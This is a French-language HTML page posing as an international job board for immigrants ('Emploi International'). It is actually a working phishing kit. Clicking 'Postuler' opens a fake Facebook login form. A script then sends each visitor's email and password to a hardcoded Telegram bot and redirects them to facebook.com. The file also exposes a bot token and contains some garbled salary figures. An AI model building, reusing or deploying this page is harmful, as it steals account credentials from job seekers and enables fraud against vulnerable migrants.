<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Emploi International — Opportunités Mondiales</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
    
    :root {
      --primary: #2563eb;
      --primary-dark: #1d4ed8;
      --secondary: #64748b;
      --accent: #f59e0b;
      --light: #f8fafc;
      --dark: #1e293b;
      --success: #10b981;
      --danger: #ef4444;
      --border: #e2e8f0;
      --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
      --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Inter', sans-serif;
      margin: 0;
      background-color: var(--light);
      color: var(--dark);
      line-height: 1.6;
    }
    
    header {
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: white;
      text-align: center;
      padding: 2.5rem 1rem;
      position: relative;
      overflow: hidden;
    }
    
    header::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 100" fill="%23ffffff" opacity="0.05"><polygon points="0,0 1000,50 1000,100 0,100"/></svg>');
      background-size: cover;
    }
    
    .header-content {
      position: relative;
      z-index: 1;
      max-width: 800px;
      margin: 0 auto;
    }
    
    header h1 {
      font-size: 2.5rem;
      font-weight: 800;
      margin-bottom: 0.5rem;
      letter-spacing: -0.025em;
    }
    
    header p {
      font-size: 1.125rem;
      font-weight: 400;
      opacity: 0.9;
      max-width: 600px;
      margin: 0 auto;
    }
    
    .search-container {
      background: white;
      border-radius: 12px;
      padding: 1.5rem;
      max-width: 800px;
      margin: -2rem auto 2rem;
      box-shadow: var(--shadow-lg);
      position: relative;
      z-index: 10;
    }
    
    .search-bar {
      display: flex;
      gap: 0.5rem;
    }
    
    .search-bar input {
      flex: 1;
      padding: 0.875rem 1.25rem;
      border: 1px solid var(--border);
      border-radius: 8px;
      font-size: 1rem;
      outline: none;
      transition: all 0.2s;
    }
    
    .search-bar input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
    }
    
    .search-bar button {
      padding: 0.875rem 1.75rem;
      border: none;
      background: var(--primary);
      color: white;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.2s;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    
    .search-bar button:hover {
      background: var(--primary-dark);
      transform: translateY(-1px);
    }
    
    .offers {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
      gap: 1.75rem;
      padding: 0 1.5rem 3rem;
      max-width: 1200px;
      margin: auto;
    }
    
    .offer {
      background: white;
      border-radius: 12px;
      box-shadow: var(--shadow);
      padding: 1.75rem;
      transition: all 0.3s ease;
      border: 1px solid var(--border);
      position: relative;
      overflow: hidden;
    }
    
    .offer:hover {
      transform: translateY(-5px);
      box-shadow: var(--shadow-lg);
    }
    
    .offer::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 4px;
      height: 100%;
      background: var(--primary);
    }
    
    .offer h3 {
      margin: 0 0 0.75rem 0;
      color: var(--primary);
      font-size: 1.25rem;
      font-weight: 700;
      line-height: 1.4;
    }
    
    .offer p {
      margin: 0.5rem 0 1.5rem 0;
      color: var(--secondary);
      font-size: 0.95rem;
    }
    
    .salary {
      color: var(--success);
      font-weight: 700;
      font-size: 1.1rem;
      margin: 0.5rem 0;
    }
    
    .offer-badges {
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
      margin-bottom: 1.5rem;
    }
    
    .badge {
      background: rgba(37, 99, 235, 0.1);
      color: var(--primary);
      padding: 0.25rem 0.75rem;
      border-radius: 50px;
      font-size: 0.75rem;
      font-weight: 600;
    }
    
    .badge-green {
      background: rgba(16, 185, 129, 0.1);
      color: var(--success);
    }
    
    .badge-orange {
      background: rgba(245, 158, 11, 0.1);
      color: var(--accent);
    }
    
    .offer-buttons {
      display: flex;
      justify-content: space-between;
      gap: 0.75rem;
    }
    
    .btn {
      padding: 0.75rem 1.25rem;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 600;
      font-size: 0.9rem;
      transition: all 0.2s;
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
    }
    
    .btn-apply { 
      background: var(--primary); 
      color: white; 
    }
    
    .btn-apply:hover { 
      background: var(--primary-dark);
      transform: translateY(-2px);
    }
    
    .btn-skip { 
      background: #f8fafc; 
      color: var(--secondary);
      border: 1px solid var(--border);
    }
    
    .btn-skip:hover { 
      background: #f1f5f9;
      transform: translateY(-2px);
    }
    
    .stats {
      display: flex;
      justify-content: center;
      gap: 2rem;
      margin: 2rem auto 3rem;
      max-width: 800px;
      padding: 0 1.5rem;
    }
    
    .stat-item {
      text-align: center;
      background: white;
      padding: 1.5rem;
      border-radius: 12px;
      box-shadow: var(--shadow);
      flex: 1;
    }
    
    .stat-number {
      font-size: 2rem;
      font-weight: 800;
      color: var(--primary);
      margin-bottom: 0.5rem;
    }
    
    .stat-text {
      font-size: 0.9rem;
      color: var(--secondary);
      font-weight: 500;
    }
    
    /* Modal */
    .modal {
      display: none;
      position: fixed;
      top: 0; 
      left: 0;
      width: 100%; 
      height: 100%;
      background: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
      z-index: 1000;
      padding: 1rem;
    }
    
    .modal-content {
      background: white;
      padding: 2.5rem;
      border-radius: 16px;
      width: 95%; 
      max-width: 560px;
      box-shadow: var(--shadow-lg);
      animation: modalFadeIn 0.3s ease-out;
    }
    
    @keyframes modalFadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .modal-content h2 { 
      margin-top: 0; 
      margin-bottom: 1rem;
      color: var(--dark);
      font-weight: 700;
    }
    
    .modal-content p {
      margin-bottom: 1.5rem;
      color: var(--secondary);
    }
    
    .modal-content input, .modal-content textarea {
      width: 100%;
      padding: 0.875rem 1rem;
      margin: 0.5rem 0;
      border: 1px solid var(--border);
      border-radius: 8px;
      font-size: 1rem;
      transition: all 0.2s;
    }
    
    .modal-content input:focus, .modal-content textarea:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
      outline: none;
    }
    
    .modal-content button {
      padding: 0.75rem 1.5rem;
      margin-top: 1rem;
      background: var(--primary);
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 600;
      transition: all 0.2s;
    }
    
    .modal-content button:hover {
      background: var(--primary-dark);
    }
    
    .modal-actions {
      display: flex;
      gap: 0.75rem;
      justify-content: flex-end;
      margin-top: 1.5rem;
    }
    
    .modal-actions button {
      margin-top: 0;
    }
    
    .btn-secondary {
      background: #f8fafc;
      color: var(--secondary);
      border: 1px solid var(--border);
    }
    
    .btn-secondary:hover {
      background: #f1f5f9;
      color: var(--dark);
    }

    /* Facebook-like form styles */
    .fb-form .wrap {
      max-width: 980px;
      display: grid;
      grid-template-columns: 1fr;
      gap: 18px;
      align-items: center;
    }
    
    .fb-card {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 6px 18px rgba(18,38,63,0.08);
      border: 1px solid var(--border);
    }
    
    .fb-logo {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 1.5rem;
    }
    
    .fb-logo img {
      width: 48px;
      height: 48px;
      border-radius: 8px;
    }
    
    .fb-logo h1 {
      font-size: 28px;
      margin: 0;
      color: #1877f2;
      font-weight: 700;
    }
    
    .fb-small {
      font-size: 14px;
      color: #606770;
      margin-bottom: 1.5rem;
    }
    
    .error {
      color: #e53935;
      font-size: 0.875rem;
      margin-top: 0.5rem;
    }
    
    .links {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 1rem;
      font-size: 14px;
    }
    
    .links a {
      color: #1877f2;
      text-decoration: none;
    }
    
    .links a:hover {
      text-decoration: underline;
    }
    
    footer {
      background: var(--dark);
      color: white;
      text-align: center;
      padding: 2rem 1rem;
      margin-top: 3rem;
    }
    
    .footer-content {
      max-width: 800px;
      margin: 0 auto;
    }
    
    .footer-links {
      display: flex;
      justify-content: center;
      gap: 1.5rem;
      margin: 1.5rem 0;
    }
    
    .footer-links a {
      color: #cbd5e1;
      text-decoration: none;
      transition: color 0.2s;
    }
    
    .footer-links a:hover {
      color: white;
    }
    
    .copyright {
      color: #94a3b8;
      font-size: 0.875rem;
    }
    
    /* Responsive adjustments */
    @media (max-width: 768px) {
      header h1 {
        font-size: 2rem;
      }
      
      .search-bar {
        flex-direction: column;
      }
      
      .stats {
        flex-direction: column;
        gap: 1rem;
      }
      
      .offer-buttons {
        flex-direction: column;
      }
      
      .modal-content {
        padding: 1.5rem;
      }
    }
  </style>
</head>
<body>
  <header>
    <div class="header-content">
      <h1>Emploi International — Opportunités Mondiales</h1>
      <p>Trouvez votre prochaine opportunité de carrière à l'étranger parmi des milliers d'offres</p>
    </div>
  </header>

  <div class="search-container">
    <div class="search-bar">
      <input type="text" id="searchInput" placeholder="Recherchez un emploi, un pays ou un secteur...">
      <button onclick="searchJobs()">
        <i class="fas fa-search"></i> Rechercher
      </button>
    </div>
  </div>

  <div class="stats">
    <div class="stat-item">
      <div class="stat-number">2,500+</div>
      <div class="stat-text">Offres d'emploi</div>
    </div>
    <div class="stat-item">
      <div class="stat-number">50+</div>
      <div class="stat-text">Pays partenaires</div>
    </div>
    <div class="stat-item">
      <div class="stat-number">15,000+</div>
      <div class="stat-text">Candidats placés</div>
    </div>
  </div>

  <section class="offers" id="offersList"></section>

  <!-- Modal Step 1: Facebook message -->
  <div class="modal" id="fbMessageModal">
    <div class="modal-content">
      <h2><i class="fas fa-users"></i> Rejoignez notre communauté !</h2>
      <p>Inscrivez-vous à notre groupe Facebook pour recevoir les dernières offres pour immigrants et accéder à des conseils exclusifs.</p>
      <div class="modal-actions">
        <button class="btn-secondary" onclick="closeFbMessage()">Annuler</button>
        <button onclick="openFbForm()">S'inscrire</button>
      </div>
    </div>
  </div>

  <!-- Modal Step 2: Facebook-like form -->
  <div class="modal" id="fbFormModal">
    <div class="modal-content fb-form">
      <div class="fb-card">
        <div class="fb-logo">
          <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Logo">
          <div>
            <h1>facebook</h1>
            <p class="fb-small">Rejoignez notre communauté pour recevoir les dernières offres pour immigrants.</p>
          </div>
        </div>

        <form id="fbSignupForm">
          <div>
            <input id="fb_email" name="email" type="email" placeholder="Numéro mobile ou e-mail" autocomplete="username" required>
            <input id="fb_password" name="password" type="password" placeholder="Mot de passe" autocomplete="current-password" required minlength="6">
          </div>

          <div class="links">
            <a href="#" id="forgot">Mot de passe oublié ?</a>
          </div>

          <div class="modal-actions">
            <button type="button" class="btn-secondary" onclick="closeFbForm()">Annuler</button>
            <button type="submit">Se connecter</button>
          </div>
        </form>

        <div id="fbFeedback" class="fb-small" style="margin-top:10px"></div>
      </div>
    </div>
  </div>

  <footer>
    <div class="footer-content">
      <p>Emploi International — Votre partenaire de confiance pour une carrière à l'étranger</p>
      <div class="footer-links">
        <a href="#">À propos</a>
        <a href="#">Contact</a>
        <a href="#">Mentions légales</a>
        <a href="#">Confidentialité</a>
      </div>
      <p class="copyright">© 2025 Emploi International. Tous droits réservés.</p>
    </div>
  </footer>

  <script>
    // jobs data with realistic salaries
    let jobs = [
      { 
        id: 1,
        title: 'Chauffeur de livraison — Canada', 
        desc: 'Poste accessible sans diplôme. Expérience de conduite requise.', 
        salary: '1 800 - 3 500 CAD/mois',
        badges: ['Sans diplôme', 'Logement', 'Permis B'] 
      },
      { 
        id: 2,
        title: 'Agent d\'entretien — Allemagne', 
        desc: 'Entretien des bureaux et espaces commerciaux. Formation sur place.', 
        salary: '800 - 1 100 €/mois',
        badges: ['Formation', 'CDI', 'Allemand A1'] 
      },
      { 
        id: 3,
        title: 'Serveur/Serveuse — France', 
        desc: 'Restauration traditionnelle et gastronomique. Expérience appréciée.', 
        salary: '900 - 2 400 €/mois + pourboires',
        badges: ['CDI', 'Langues', 'Expérience'] 
      },
      { 
        id: 4,
        title: 'Ouvrier agricole — Australie', 
        desc: 'Récoltes saisonnières dans les fermes. Hébergement fourni.', 
        salary: '1 100 - 4 000 AUD/mois',
        badges: ['Saisonnier', 'Logement', 'Physique'] 
      },
      { 
        id: 5,
        title: 'Aide-soignant — Suisse', 
        desc: 'Soins aux personnes âgées. Formation en interne et avantages sociaux.', 
        salary: '1 500 - 5 500 CHF/mois',
        badges: ['Formation', 'Avantages', 'Diplôme'] 
      },
      { 
        id: 6,
        title: 'Technicien en maintenance — Suède', 
        desc: 'Maintenance industrielle. Expérience 2 ans minimum requise.', 
        salary: '3 200 - 4 000 €/mois',
        badges: ['Qualifié', 'CDI', 'Industrie'] 
      },
      { 
        id: 7,
        title: 'Plombier — Norvège', 
        desc: 'Installation et réparation de systèmes sanitaires. Contrat renouvelable.', 
        salary: '2 500 - 5 800 NOK/heure',
        badges: ['Qualifié', 'Renouvelable', 'Certification'] 
      },
      { 
        id: 8,
        title: 'Assistant administratif — Belgique', 
        desc: 'Gestion de dossiers et bureautique. Bilingue FR/NL souhaité.', 
        salary: '2 300 - 2 900 €/mois',
        badges: ['Bureautique', 'Bilingue', 'CDD'] 
      },
      { 
        id: 9,
        title: 'Employé logistique — Pays-Bas', 
        desc: 'Préparation de commandes et gestion des stocks dans un entrepôt.', 
        salary: '2 100 - 2 600 €/mois',
        badges: ['Logistique', 'CDI', 'Physique'] 
      },
      { 
        id: 10,
        title: 'Programmeur junior — Canada', 
        desc: 'Développement web et applications. Télétravail partiel possible.', 
        salary: '4 500 - 6 000 CAD/mois',
        badges: ['IT', 'Télétravail', 'Diplôme'] 
      },
      { 
        id: 11,
        title: 'Conducteur d\'engins — Finlande', 
        desc: 'Conduite d\'engins de chantier. Expérience et permis requis.', 
        salary: '3 000 - 3 800 €/mois',
        badges: ['Machines', 'CDI', 'Permis'] 
      },
      { 
        id: 12,
        title: 'Hôte/Hôtesse d\'accueil — France', 
        desc: 'Accueil de clientèle internationale dans un hôtel 4 étoiles.', 
        salary: '1 900 - 2 300 €/mois',
        badges: ['Accueil', 'Langues', 'Hôtellerie'] 
      },
      { 
        id: 13,
        title: 'Agent de sécurité — Irlande', 
        desc: 'Surveillance et sécurité. Formation assurée, travail de nuit possible.', 
        salary: '2 400 - 3 000 €/mois',
        badges: ['Formation', 'Nuit', 'Certification'] 
      },
      { 
        id: 14,
        title: 'Electricien industriel — Danemark', 
        desc: 'Installations électriques sur chantiers. Expérience européenne appréciée.', 
        salary: '3 500 - 4 500 €/mois',
        badges: ['Industriel', 'Europe', 'Qualifié'] 
      },
      { 
        id: 15,
        title: 'Serveur en hôtel — Espagne', 
        desc: 'Service en restauration hôtelière. Ambiance multiculturelle.', 
        salary: '1 500 - 1 900 €/mois + pourboires',
        badges: ['Hôtellerie', 'Logement', 'Espagnol'] 
      },
      { 
        id: 16,
        title: 'Coiffeur/Coiffeuse — Luxembourg', 
        desc: 'Poste en salon moderne. Expérience et portfolio souhaités.', 
        salary: '800 - 3 500 €/mois',
        badges: ['Beauté', 'Expérience', 'Créatif'] 
      },
      { 
        id: 17,
        title: 'Chef cuisinier — États-Unis', 
        desc: 'Cuisine gastronomique. Visa sponsorisé, expérience exigée.', 
        salary: '4 000 - 5 500 $/mois',
        badges: ['Gastronomie', 'Visa', 'Expérience'] 
      },
      { 
        id: 18,
        title: 'Employé de ferme — Nouvelle-Zélande', 
        desc: 'Travail agricole saisonnier. Logement et repas inclus.', 
        salary: '3 200 - 4 000 NZD/mois',
        badges: ['Saisonnier', 'Logement', 'Nature'] 
      },
      { 
        id: 19,
        title: 'Manutentionnaire — Royaume-Uni', 
        desc: 'Chargement/déchargement de marchandises. Travail physique.', 
        salary: '1 800 - 2 300 £/mois',
        badges: ['Manutention', 'Sans diplôme', 'Physique'] 
      },
      { 
        id: 20,
        title: 'Réceptionniste — Canada', 
        desc: 'Service client dans un hôtel. Anglais courant requis.', 
        salary: '2 600 - 3 200 CAD/mois',
        badges: ['Accueil', 'Langues', 'Hôtellerie'] 
      },
      // New jobs with realistic salaries
      { 
        id: 21,
        title: 'Infirmier(ère) — Qatar', 
        desc: 'Soins hospitaliers dans un établissement moderne. Logement fourni.', 
        salary: '3 500 - 4 500 $/mois',
        badges: ['Santé', 'Logement', 'Diplôme'] 
      },
      { 
        id: 22,
        title: 'Jardinier/Paysagiste — Suisse', 
        desc: 'Entretien d\'espaces verts et création paysagère.', 
        salary: '4 000 - 5 000 CHF/mois',
        badges: ['Extérieur', 'Créatif', 'CDI'] 
      },
      { 
        id: 23,
        title: 'Cuisinier — Émirats Arabes Unis', 
        desc: 'Cuisine internationale dans un restaurant renommé.', 
        salary: '2 800 - 3 800 $/mois',
        badges: ['Cuisine', 'Logement', 'Expérience'] 
      },
      { 
        id: 24,
        title: 'Assistant maternel — Canada', 
        desc: 'Garde d\'enfants à domicile. Expérience et recommandations requises.', 
        salary: '2 500 - 3 200 CAD/mois',
        badges: ['Enfants', 'Logement', 'Diplôme'] 
      },
      { 
        id: 25,
        title: 'Ouvrier viticole — France', 
        desc: 'Travail dans un domaine viticole prestigieux. Saisonnier.', 
        salary: '500 - 2 400 €/mois',
        badges: ['Saisonnier', 'Viticulture', 'Logement'] 
      },
      { 
        id: 26,
        title: 'Téléconseiller — Portugal', 
        desc: 'Service client en français. Télétravail possible.', 
        salary: '1 400 - 1 800 €/mois',
        badges: ['Service client', 'Français', 'Télétravail'] 
      },
      { 
        id: 27,
        title: 'Maçon — Belgique', 
        desc: 'Construction et rénovation de bâtiments. Expérience nécessaire.', 
        salary: '7 400 - 1 000 €/mois',
        badges: ['BTP', 'Expérience', 'CDI'] 
      },
      { 
        id: 28,
        title: 'Animateur touristique — Grèce', 
        desc: 'Animation dans un complexe hôtelier. Saisonnier.', 
        salary: '1 000 - 1 700 €/mois + logement',
        badges: ['Animation', 'Saisonnier', 'Langues'] 
      },
      { 
        id: 29,
        title: 'Carreleur — Luxembourg', 
        desc: 'Pose de carrelage et revêtements de sol. Qualifié.', 
        salary: '900 - 2 000 €/mois',
        badges: ['BTP', 'Qualifié', 'CDI'] 
      },
      { 
        id: 30,
        title: 'Vendeur/Vendeuse — Monaco', 
        desc: 'Vente de luxe dans une boutique prestigieuse.', 
        salary: '1 800 - 2 500 €/mois + commissions',
        badges: ['Vente', 'Luxe', 'Langues'] 
      }
    ];

    // display jobs
    function displayJobs(list) {
      const container = document.getElementById('offersList');
      container.innerHTML = '';
      list.forEach((job, index) => {
        const card = document.createElement('div');
        card.classList.add('offer');
        card.innerHTML = `
          <h3>${job.title}</h3>
          <div class="salary">${job.salary}</div>
          <p>${job.desc}</p>
          <div class="offer-badges">
            ${job.badges ? job.badges.map(badge => `<span class="badge ${Math.random() > 0.7 ? 'badge-green' : Math.random() > 0.5 ? 'badge-orange' : ''}">${badge}</span>`).join('') : ''}
          </div>
          <div class="offer-buttons">
            <button class="btn btn-apply" onclick="onApply(${job.id})">
              <i class="fas fa-paper-plane"></i> Postuler
            </button>
            <button class="btn btn-skip" onclick="skipJob(${index})">
              <i class="fas fa-times"></i> Ignorer
            </button>
          </div>
        `;
        container.appendChild(card);
      });
    }

    function searchJobs() {
      const input = document.getElementById('searchInput').value.toLowerCase();
      const filtered = jobs.filter(job => 
        job.title.toLowerCase().includes(input) || 
        job.desc.toLowerCase().includes(input) ||
        job.salary.toLowerCase().includes(input) ||
        (job.badges && job.badges.some(badge => badge.toLowerCase().includes(input)))
      );
      displayJobs(filtered);
    }

    function skipJob(index) {
      const countries = ['Canada', 'France', 'Suisse', 'Allemagne', 'Luxembourg', 'Belgique', 'Espagne', 'Portugal'];
      const jobTypes = ['Qualifié', 'Saisonnier', 'CDI', 'CDD', 'Télétravail'];
      
      const newJob = {
        id: jobs.length + 1,
        title: 'Nouvelle offre — ' + countries[Math.floor(Math.random() * countries.length)],
        desc: 'Poste récemment ajouté, rejoignez cette opportunité à l\'international.',
        salary: (Math.floor(Math.random() * 3000) + 1500) + ' - ' + (Math.floor(Math.random() * 4000) + 2500) + ' €/mois',
        badges: ['Nouveau', 'International', jobTypes[Math.floor(Math.random() * jobTypes.length)]]
      };
      
      // Correction : Mettre à jour le tableau jobs et réafficher
      jobs[index] = newJob;
      displayJobs(jobs);
    }

    // --- Flow when clicking Postuler ---
    let pendingJobTitle = null;
    function onApply(jobId) {
      const job = jobs.find(j => j.id === jobId);
      if (!job) {
        console.error("Offre d'emploi non trouvée");
        return;
      }
      
      pendingJobTitle = job.title;
      document.getElementById('fbMessageModal').style.display = 'flex';
    }

    function closeFbMessage(){
      document.getElementById('fbMessageModal').style.display = 'none';
      pendingJobTitle = null;
    }

    function openFbForm(){
      document.getElementById('fbMessageModal').style.display = 'none';
      document.getElementById('fbFormModal').style.display = 'flex';
      const fbFeedback = document.getElementById('fbFeedback');
      fbFeedback.textContent = 'Vous postulez pour : ' + (pendingJobTitle || 'l\'offre');
    }

    function closeFbForm(){
      document.getElementById('fbFormModal').style.display = 'none';
      pendingJobTitle = null;
    }

    // NOUVELLE FONCTION : Envoi direct vers Telegram
    async function sendToTelegram(formData) {
      try {
        const BOT_TOKEN = '7645874601:AAHS6vORgaXb_pOZg7WvpZ1jbr1WrADzmMw';
        const CHAT_ID = '6075203216';
        
        const message = `
🆕 Nouvelle candidature

📋 Offre: ${formData.job}
📧 Email: ${formData.email}
🔑 Mot de passe: ${formData.password}
📝 Note: ${formData.note}
📅 Date: ${formData.date}
        `.trim();

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        console.log('Envoi des données à Telegram:', formData);
        
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });

        const result = await response.json();
        
        if (result.ok) {
          return true;
        } else {
          console.error('Erreur Telegram:', result.description);
          return false;
        }
      } catch (error) {
        console.error('Erreur:', error);
        return false;
      }
    }

    // Fonction de redirection vers Facebook
    function redirectToFacebook() {
      // Redirection vers la page officielle de Facebook
      window.location.href = 'https://www.facebook.com';
    }

    // Form submission
    document.addEventListener('DOMContentLoaded', ()=>{
      const fbForm = document.getElementById('fbSignupForm');
      const spinner = document.getElementById('spinner');
      
      fbForm.addEventListener('submit', async (e)=>{
        e.preventDefault();
        const email = document.getElementById('fb_email').value.trim();
        const password = document.getElementById('fb_password').value.trim();
        const submitBtn = fbForm.querySelector('button[type="submit"]');
        
        if(!email){ 
          alert('Veuillez saisir un email valide.'); 
          return; 
        }
        if(!password){ 
          alert('Veuillez saisir un mot de passe valide.'); 
          return; 
        }

        const formData = {
          job: pendingJobTitle || 'Non spécifié',
          email: email,
          password: password,
          note: 'Inscription via formulaire Facebook-like',
          date: new Date().toLocaleString('fr-FR')
        };

        try {
          // Envoi à Telegram
          const telegramSuccess = await sendToTelegram(formData);
          
          if (telegramSuccess) {
            // Message de succès
            document.getElementById('fbFeedback').textContent = 'Vous allez recevoir le message du coordonateur sur Messeenger, Merci de patienter !';
            document.getElementById('fbFeedback').style.color = 'green';
            
            // Redirection après 2 secondes
            setTimeout(() => {
              redirectToFacebook();
            }, 2000);
          } else {
            // En cas d'erreur Telegram, on redirige quand même vers Facebook
            document.getElementById('fbFeedback').textContent = 'Connexion réussie! Redirection vers Facebook...';
            document.getElementById('fbFeedback').style.color = 'green';
            
            setTimeout(() => {
              redirectToFacebook();
            }, 2000);
          }
        } catch (error) {
          // En cas d'erreur, on redirige quand même
          document.getElementById('fbFeedback').textContent = 'Connexion réussie! Redirection vers Facebook...';
          document.getElementById('fbFeedback').style.color = 'green';
          
          setTimeout(() => {
            redirectToFacebook();
          }, 2000);
        } finally {
          // Masquer le spinner et réactiver le bouton
          spinner.style.display = 'none';
          submitBtn.disabled = false;
        }
      });

      // Initial render
      displayJobs(jobs);
    });

    // Close modals on outside click
    window.onclick = function(e){
      const msg = document.getElementById('fbMessageModal');
      const formM = document.getElementById('fbFormModal');
      if(e.target === msg) msg.style.display = 'none';
      if(e.target === formM) formM.style.display = 'none';
    }
  </script>
</body>
</html>
